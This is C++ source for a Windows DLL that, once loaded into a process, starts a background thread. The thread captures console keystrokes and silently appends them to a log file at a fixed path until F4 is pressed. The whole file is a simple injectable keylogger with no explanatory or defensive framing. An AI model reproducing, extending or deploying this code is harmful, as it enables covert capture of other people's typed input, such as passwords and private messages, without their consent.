#include <Windows.h>
#include <conio.h>
#include <fstream>

HANDLE handle = NULL;
void MainLoop()
{
    const char path[] = "D:\\downloads\\wind\\log.txt";
    for (;;)
    {
        if (GetAsyncKeyState(VK_F4))
        {
            CloseHandle(handle);
            break;
        }
        if (_kbhit())
        {
            std::ofstream file(path, std::ios::app);
            file << (char)_getch();
            file.close();
        }
    }
}

BOOL APIENTRY DllMain(HINSTANCE h, DWORD reason, LPVOID r)
{
    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
    {
        handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainLoop, (void*)NULL, 0, NULL);
        break;
    }
    case DLL_PROCESS_DETACH:
        CloseHandle(handle);
        break;
    }
    return TRUE;
}
